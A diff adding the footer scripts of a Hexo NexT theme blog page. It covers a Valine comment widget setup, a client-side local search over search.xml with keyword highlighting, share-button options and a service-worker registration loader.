+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+  <script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+  <script src="//unpkg.com/valine/dist/Valine.min.js"></script>
+  
+  <script type="text/javascript">
+    var GUEST = ['nick','mail','link'];
+    var guest = 'nick,mail,link';
+    guest = guest.split(',').filter(item=>{
+      return GUEST.indexOf(item)>-1;
+    });
+    new Valine({
+        el: '#comments' ,
+        verify: false,
+        notify: false,
+        appId: 'cM9V6UXqe4qtpXHOvQO5eS6R-gzGzoHsz',
+        appKey: 'lzYVPw46IOBJRFvDrn85wuxE',
+        placeholder: '欢迎大家 畅所欲言',
+        avatar:'mm',
+        guest_info:guest,
+        pageSize:'10' || 10,
+    });
+  </script>
+
+
+
+  
+
+  <script type="text/javascript">
+    // Popup Window;
+    var isfetched = false;
+    var isXml = true;
+    // Search DB path;
+    var search_path = "search.xml";
+    if (search_path.length === 0) {
+      search_path = "search.xml";
+    } else if (/json$/i.test(search_path)) {
+      isXml = false;
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    var onPopupClose = function (e) {
+      $('.popup').hide();
+      $('#local-search-input').val('');
+      $('.search-result-list').remove();
+      $('#no-result').remove();
+      $(".local-search-pop-overlay").remove();
+      $('body').css('overflow', '');
+    }
+
+    function proceedsearch() {
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
+        .css('overflow', 'hidden');
+      $('.search-popup-overlay').click(onPopupClose);
+      $('.popup').toggle();
+      var $localSearchInput = $('#local-search-input');
+      $localSearchInput.attr("autocapitalize", "none");
+      $localSearchInput.attr("autocorrect", "off");
+      $localSearchInput.focus();
+    }
+
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+
+      // start loading animation
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
+          '<div id="search-loading-icon">' +
+          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
+          '</div>' +
+          '</div>')
+        .css('overflow', 'hidden');
+      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');
+
+      $.ajax({
+        url: path,
+        dataType: isXml ? "xml" : "json",
+        async: true,
+        success: function(res) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = isXml ? $("entry", res).map(function() {
+            return {
+              title: $("title", this).text(),
+              content: $("content",this).text(),
+              url: $("url" , this).text()
+            };
+          }).get() : res;
+          var input = document.getElementById(search_id);
+          var resultContent = document.getElementById(content_id);
+          var inputEventFunction = function() {
+            var searchText = input.value.trim().toLowerCase();
+            var keywords = searchText.split(/[\s\-]+/);
+            if (keywords.length > 1) {
+              keywords.push(searchText);
+            }
+            var resultItems = [];
+            if (searchText.length > 0) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var hitCount = 0;
+                var searchTextCount = 0;
+                var title = data.title.trim();
+                var titleInLowerCase = title.toLowerCase();
+                var content = data.content.trim().replace(/<[^>]+>/g,"");
+                var contentInLowerCase = content.toLowerCase();
+                var articleUrl = decodeURIComponent(data.url);
+                var indexOfTitle = [];
+                var indexOfContent = [];
+                // only match articles with not empty titles
+                if(title != '') {
+                  keywords.forEach(function(keyword) {
+                    function getIndexByWord(word, text, caseSensitive) {
+                      var wordLen = word.length;
+                      if (wordLen === 0) {
+                        return [];
+                      }
+                      var startPosition = 0, position = [], index = [];
+                      if (!caseSensitive) {
+                        text = text.toLowerCase();
+                        word = word.toLowerCase();
+                      }
+                      while ((position = text.indexOf(word, startPosition)) > -1) {
+                        index.push({position: position, word: word});
+                        startPosition = position + wordLen;
+                      }
+                      return index;
+                    }
+
+                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
+                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
+                  });
+                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
+                    isMatch = true;
+                    hitCount = indexOfTitle.length + indexOfContent.length;
+                  }
+                }
+
+                // show search results
+
+                if (isMatch) {
+                  // sort index by position of keyword
+
+                  [indexOfTitle, indexOfContent].forEach(function (index) {
+                    index.sort(function (itemLeft, itemRight) {
+                      if (itemRight.position !== itemLeft.position) {
+                        return itemRight.position - itemLeft.position;
+                      } else {
+                        return itemLeft.word.length - itemRight.word.length;
+                      }
+                    });
+                  });
+
+                  // merge hits into slices
+
+                  function mergeIntoSlice(text, start, end, index) {
+                    var item = index[index.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    var hits = [];
+                    var searchTextCountInSlice = 0;
+                    while (position + word.length <= end && index.length != 0) {
+                      if (word === searchText) {
+                        searchTextCountInSlice++;
+                      }
+                      hits.push({position: position, length: word.length});
+                      var wordEnd = position + word.length;
+
+                      // move to next position of hit
+
+                      index.pop();
+                      while (index.length != 0) {
+                        item = index[index.length - 1];
+                        position = item.position;
+                        word = item.word;
+                        if (wordEnd > position) {
+                          index.pop();
+                        } else {
+                          break;
+                        }
+                      }
+                    }
+                    searchTextCount += searchTextCountInSlice;
+                    return {
+                      hits: hits,
+                      start: start,
+                      end: end,
+                      searchTextCount: searchTextCountInSlice
+                    };
+                  }
+
+                  var slicesOfTitle = [];
+                  if (indexOfTitle.length != 0) {
+                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
+                  }
+
+                  var slicesOfContent = [];
+                  while (indexOfContent.length != 0) {
+                    var item = indexOfContent[indexOfContent.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    // cut out 100 characters
+                    var start = position - 20;
+                    var end = position + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if (end < position + word.length) {
+                      end = position + word.length;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
+                  }
+
+                  // sort slices in content by search text's count and hits' count
+
+                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
+                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
+                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
+                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
+                      return sliceRight.hits.length - sliceLeft.hits.length;
+                    } else {
+                      return sliceLeft.start - sliceRight.start;
+                    }
+                  });
+
+                  // select top N slices in content
+
+                  var upperBound = parseInt('1');
+                  if (upperBound >= 0) {
+                    slicesOfContent = slicesOfContent.slice(0, upperBound);
+                  }
+
+                  // highlight title and content
+
+                  function highlightKeyword(text, slice) {
+                    var result = '';
+                    var prevEnd = slice.start;
+                    slice.hits.forEach(function (hit) {
+                      result += text.substring(prevEnd, hit.position);
+                      var end = hit.position + hit.length;
+                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
+                      prevEnd = end;
+                    });
+                    result += text.substring(prevEnd, slice.end);
+                    return result;
+                  }
+
+                  var resultItem = '';
+
+                  if (slicesOfTitle.length != 0) {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
+                  } else {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
+                  }
+
+                  slicesOfContent.forEach(function (slice) {
+                    resultItem += "<a href='" + articleUrl + "'>" +
+                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
+                      "...</p>" + "</a>";
+                  });
+
+                  resultItem += "</li>";
+                  resultItems.push({
+                    item: resultItem,
+                    searchTextCount: searchTextCount,
+                    hitCount: hitCount,
+                    id: resultItems.length
+                  });
+                }
+              })
+            };
+            if (keywords.length === 1 && keywords[0] === "") {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
+            } else if (resultItems.length === 0) {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
+            } else {
+              resultItems.sort(function (resultLeft, resultRight) {
+                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
+                  return resultRight.searchTextCount - resultLeft.searchTextCount;
+                } else if (resultLeft.hitCount !== resultRight.hitCount) {
+                  return resultRight.hitCount - resultLeft.hitCount;
+                } else {
+                  return resultRight.id - resultLeft.id;
+                }
+              });
+              var searchResultList = '<ul class=\"search-result-list\">';
+              resultItems.forEach(function (result) {
+                searchResultList += result.item;
+              })
+              searchResultList += "</ul>";
+              resultContent.innerHTML = searchResultList;
+            }
+          }
+
+          if ('auto' === 'auto') {
+            input.addEventListener('input', inputEventFunction);
+          } else {
+            $('.search-icon').click(inputEventFunction);
+            input.addEventListener('keypress', function (event) {
+              if (event.keyCode === 13) {
+                inputEventFunction();
+              }
+            });
+          }
+
+          // remove loading animation
+          $(".local-search-pop-overlay").remove();
+          $('body').css('overflow', '');
+
+          proceedsearch();
+        }
+      });
+    }
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched === false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(onPopupClose);
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+    $(document).on('keyup', function (event) {
+      var shouldDismissSearchPopup = event.which === 27 &&
+        $('.search-popup').is(':visible');
+      if (shouldDismissSearchPopup) {
+        onPopupClose();
+      }
+    });
+  </script>
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+  
+  <link rel="stylesheet" href="/lib/needsharebutton/needsharebutton.css">
+
+  
+  
+  <script src="/lib/needsharebutton/needsharebutton.js"></script>
+
+  <script>
+    
+      pbOptions = {};
+      
+          pbOptions.iconStyle = "default";
+      
+          pbOptions.boxForm = "horizontal";
+      
+          pbOptions.position = "bottomCenter";
+      
+          pbOptions.networks = "Weibo,Wechat,Douban,QQZone,Twitter,Facebook";
+      
+      new needShareButton('#needsharebutton-postbottom', pbOptions);
+    
+    
+      flOptions = {};
+      
+          flOptions.iconStyle = "default";
+      
+          flOptions.boxForm = "vertical";
+      
+          flOptions.position = "topRight";
+      
+          flOptions.networks = "Weibo,Wechat,Douban,QQZone,Twitter,Facebook";
+      
+      new needShareButton('#needsharebutton-float', flOptions);
+    
+  </script>
+
+  
+
+  
+
+  
+
+  
+
+<script type="text/javascript" src="/lib/clipboard/clipboard.js"></script>
+<script type="text/javascript" src="/js/src/custom.js"></script>
+<script async>window.onload=function(){var a=document.createElement('script'),b=document.getElementsByTagName('script')[0];a.type='text/javascript',a.async=!0,a.src='/sw-register.js?v='+Date.now(),b.parentNode.insertBefore(a,b)};</script></body></html>
